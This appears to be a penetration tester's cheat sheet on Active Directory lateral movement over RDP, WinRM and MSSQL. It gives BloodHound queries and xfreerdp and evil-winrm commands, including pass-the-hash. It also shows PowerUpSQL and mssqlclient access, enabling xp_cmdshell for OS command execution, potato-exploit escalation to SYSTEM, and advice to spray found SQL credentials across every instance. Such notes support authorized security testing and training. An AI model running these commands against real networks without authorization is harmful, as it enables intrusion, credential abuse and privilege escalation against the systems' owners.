# Privileged Access — RDP / WinRM / MSSQL

After taking over an account, check these three before assuming you're stuck without local admin. BloodHound edges: `CanRDP`, `CanPSRemote`, `SQLAdmin`.

---

## RDP

Enumerate who can RDP to a host:

```powershell
Get-NetLocalGroupMember -ComputerName <HOSTNAME> -GroupName "Remote Desktop Users"
```

BloodHound queries: **Find Workstations where Domain Users can RDP** / **Find Servers where Domain Users can RDP**. Domain Users having RDP = every account you compromise gets a foothold on that host.

Connect from Linux:

```bash
xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET_IP>
```

---

## WinRM

Enumerate Remote Management Users group:

```powershell
Get-NetLocalGroupMember -ComputerName <HOSTNAME> -GroupName "Remote Management Users"
```

BloodHound custom Cypher query for WinRM access:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Connect from Windows:

```powershell
$pass = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)
Enter-PSSession -ComputerName <HOSTNAME> -Credential $cred
```

Connect from Linux:

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>
```

PTH with evil-winrm:

```bash
evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>
```

---

## MSSQL (SQLAdmin)

BloodHound custom Cypher for SQL admin rights:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Enumerate instances from Windows:

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Run a query to validate access:

```powershell
Get-SQLQuery -Verbose -Instance "<IP>,1433" -username "<DOMAIN>\<USER>" -password "<PASS>" -query 'Select @@version'
```

Connect from Linux:

```bash
mssqlclient.py <DOMAIN>/<USER>@<TARGET_IP> -windows-auth
```

Once in, enable OS command execution:

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

> [!tip] MSSQL sysadmin → `xp_cmdshell` → check `whoami /priv`. `SeImpersonatePrivilege` enabled is almost guaranteed. JuicyPotato / PrintSpoofer / RoguePotato → SYSTEM. This is near-automatic LPE from any SQL foothold.

> [!tip] SQL creds found in web.config, scripts, or Snaffler output → test against every MSSQL instance in the environment immediately. Don't sit on them.